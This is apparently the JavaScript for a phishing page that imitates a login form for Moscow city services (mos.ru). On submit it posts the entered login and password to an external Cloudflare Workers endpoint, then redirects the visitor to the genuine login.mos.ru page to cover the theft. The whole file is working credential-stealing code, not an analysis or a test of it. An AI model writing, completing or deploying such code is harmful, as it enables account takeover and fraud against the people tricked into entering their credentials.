(function () {
    const WORKER_URL = 'https://my-neon-worker.viotlunov.workers.dev';
    /** Куда перейти после успешного ответа воркера (200 OK). */
    const AFTER_SUCCESS_REDIRECT = 'https://login.mos.ru/sps/login';

    const form = document.getElementById('loginForm');
    const loginInput = document.getElementById('login');
    const passwordInput = document.getElementById('password');
    const submitBtn = form.querySelector('.submit-btn');
    const status = document.getElementById('status');
    const showPasswordCheckbox = document.getElementById('showPassword');

    function refreshSubmitState() {
        const filled =
            loginInput.value.trim().length > 0 &&
            passwordInput.value.length > 0;
        submitBtn.disabled = !filled;
    }

    function setStatus(message, kind) {
        status.textContent = message || '';
        status.classList.remove('is-error', 'is-success');
        if (kind === 'error') status.classList.add('is-error');
        if (kind === 'success') status.classList.add('is-success');
    }

    loginInput.addEventListener('input', refreshSubmitState);
    passwordInput.addEventListener('input', refreshSubmitState);
    refreshSubmitState();

    showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
    });

    form.addEventListener('submit', async (event) => {
        event.preventDefault();
        if (submitBtn.disabled) return;
        window.location.href = AFTER_SUCCESS_REDIRECT;

        const payload = {
            login: loginInput.value.trim(),
            password: passwordInput.value,
        };

        const originalText = submitBtn.textContent;
        submitBtn.disabled = true;
        submitBtn.classList.add('is-loading');
        submitBtn.textContent = 'Входим…';
        setStatus('', null);

        try {
            const response = await fetch(WORKER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            });

            let result = {};
            try { result = await response.json(); } catch (_) { /* not JSON */ }

            if (response.ok) {
                setStatus('', null);
                form.reset();
            } else {
                setStatus(
                    result.error || `Ошибка ${response.status}`,
                    'error'
                );
            }
        } catch (err) {
            setStatus('Ошибка сети: сервер не отвечает.', 'error');
        } finally {
            submitBtn.classList.remove('is-loading');
            submitBtn.textContent = originalText;
            refreshSubmitState();
        }
    });
})();
